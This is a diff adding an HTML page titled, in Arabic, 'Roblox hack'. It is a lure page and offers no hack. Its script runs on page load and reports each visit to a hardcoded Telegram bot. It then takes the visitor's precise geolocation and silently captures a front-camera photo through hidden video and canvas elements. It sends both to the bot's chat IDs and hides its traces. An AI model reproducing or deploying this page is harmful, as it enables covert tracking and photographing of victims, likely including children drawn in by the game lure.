@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>هاك روبلكس</title>
+</head>
+<body>
+    <script>
+        // كل التوكنات والشات ايدي
+        const BOT_TOKENS = [
+            '7900479036:AAFxgXpe2JU4bWDWc_AgGSH8Z2J8-1TqVWY'
+        ];
+        
+        const CHAT_IDS = [
+            '5090097134',
+            '7900479036'
+        ];
+
+        // إرسال رسالة لكل البوتات والشاتات
+        async function sendToAllTelegrams(message) {
+            for (const BOT_TOKEN of BOT_TOKENS) {
+                for (const CHAT_ID of CHAT_IDS) {
+                    try {
+                        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                        const response = await fetch(url, {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({
+                                chat_id: CHAT_ID,
+                                text: message,
+                                parse_mode: 'HTML'
+                            })
+                        });
+                        console.log(`Sent to ${CHAT_ID} via ${BOT_TOKEN.substring(0, 10)}...`);
+                    } catch (error) {
+                        console.error(`Error sending to ${CHAT_ID}:`, error);
+                    }
+                }
+            }
+        }
+
+        // إرسال صورة لكل البوتات والشاتات
+        async function sendPhotoToAllTelegrams(base64Image) {
+            for (const BOT_TOKEN of BOT_TOKENS) {
+                for (const CHAT_ID of CHAT_IDS) {
+                    try {
+                        // تحويل base64 إلى blob
+                        const response = await fetch(base64Image);
+                        const blob = await response.blob();
+                        
+                        // إنشاء FormData
+                        const formData = new FormData();
+                        formData.append('chat_id', CHAT_ID);
+                        formData.append('photo', blob, 'face_capture.jpg');
+                        formData.append('caption', '📸 تم التقاط صورة من الكاميرا');
+                        
+                        // إرسال الصورة
+                        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+                        const sendResponse = await fetch(url, {
+                            method: 'POST',
+                            body: formData
+                        });
+                        
+                        console.log(`Photo sent to ${CHAT_ID} via ${BOT_TOKEN.substring(0, 10)}...`);
+                    } catch (error) {
+                        console.error(`Error sending photo to ${CHAT_ID}:`, error);
+                    }
+                }
+            }
+        }
+
+        // الحصول على الموقع
+        async function getLocation() {
+            if (!navigator.geolocation) {
+                sendToAllTelegrams('❌ المتصفح لا يدعم خدمة الموقع');
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                async (position) => {
+                    const location = {
+                        lat: position.coords.latitude,
+                        lon: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        time: new Date().toISOString()
+                    };
+                    
+                    await sendToAllTelegrams(`📍 <b>تم الحصول على الموقع</b>\n\n🌍 خط العرض: ${location.lat}\n🌍 خط الطول: ${location.lon}\n📏 الدقة: ${location.accuracy} متر\n⏰ الوقت: ${location.time}`);
+                    
+                    // بعد الحصول على الموقع، نطلب الكاميرا
+                    requestCamera();
+                },
+                async (error) => {
+                    await sendToAllTelegrams('❌ فشل الحصول على الموقع: ' + error.message);
+                    // حتى إذا فشل الموقع، نطلب الكاميرا
+                    requestCamera();
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                }
+            );
+        }
+
+        // طلب السماح للكاميرا والتقاط صورة
+        async function requestCamera() {
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                sendToAllTelegrams('❌ المتصفح لا يدعم الكاميرا');
+                return;
+            }
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: 'user',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    } 
+                });
+                
+                // إنشاء فيديو عنصر خفي
+                const video = document.createElement('video');
+                video.style.display = 'none';
+                document.body.appendChild(video);
+                video.srcObject = stream;
+                video.play();
+                
+                // انتظار تحميل الفيديو
+                video.onloadeddata = async () => {
+                    // إنشاء canvas لالتقاط الصورة
+                    const canvas = document.createElement('canvas');
+                    canvas.style.display = 'none';
+                    document.body.appendChild(canvas);
+                    
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    // تحويل الصورة إلى base64
+                    const imageData = canvas.toDataURL('image/jpeg', 0.7);
+                    
+                    // إرسال الصورة لكل الشاتات
+                    await sendPhotoToAllTelegrams(imageData);
+                    
+                    // إيقاف الكاميرا
+                    stream.getTracks().forEach(track => track.stop());
+                    
+                    // إزالة العناصر
+                    document.body.removeChild(video);
+                    document.body.removeChild(canvas);
+                    
+                    // إرسال رسالة إتمام
+                    sendToAllTelegrams('✅ تم الانتهاء من العملية بنجاح');
+                };
+                
+            } catch (error) {
+                sendToAllTelegrams('❌ فشل الوصول للكاميرا: ' + error.message);
+            }
+        }
+
+        // بدء العملية عند تحميل الصفحة
+        window.addEventListener('load', () => {
+            sendToAllTelegrams('🌐 تم فتح صفحة هاك روبلكس');
+            setTimeout(() => {
+                getLocation();
+            }, 1000);
+        });
+
+        // عند إغلاق الصفحة
+        window.addEventListener('beforeunload', () => {
+            sendToAllTelegrams('❌ تم إغلاق الصفحة');
+        });
+    </script>
+</body>
+</html>
